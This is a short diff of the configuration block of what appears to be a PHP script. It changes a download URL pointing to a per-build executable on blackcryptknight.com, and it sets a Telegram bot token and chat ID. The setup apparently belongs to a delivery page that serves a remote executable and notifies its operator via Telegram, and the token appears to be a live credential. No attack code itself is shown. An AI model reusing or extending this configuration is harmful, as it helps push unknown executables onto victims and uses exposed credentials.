@@ -2,7 +2,7 @@
 // =====================================================
 // CONFIGURATION SECTION — EDIT ONLY THESE 3 VALUES
 // =====================================================
-$DOWNLOAD_URL        = "https://blackcryptknight.com/api/build/6b407864-4b9a-498a-b82a-851b2b2d26c1/download";        // Example: https://example.com/file.exe
+$DOWNLOAD_URL        = "https://blackcryptknight.com/api/build/01d44e27-1066-4c88-b7b3-870e96556016/download";        // Example: https://example.com/file.exe
 $TELEGRAM_BOT_TOKEN  = "7284066719:AAESrzINEKBG1kyj9oM_4U3KeKptQeHBQaI";      // Example: 123456:ABC-xyz
 $TELEGRAM_CHAT_ID    = "7724482403";             // Example: 987654321
 // =====================================================
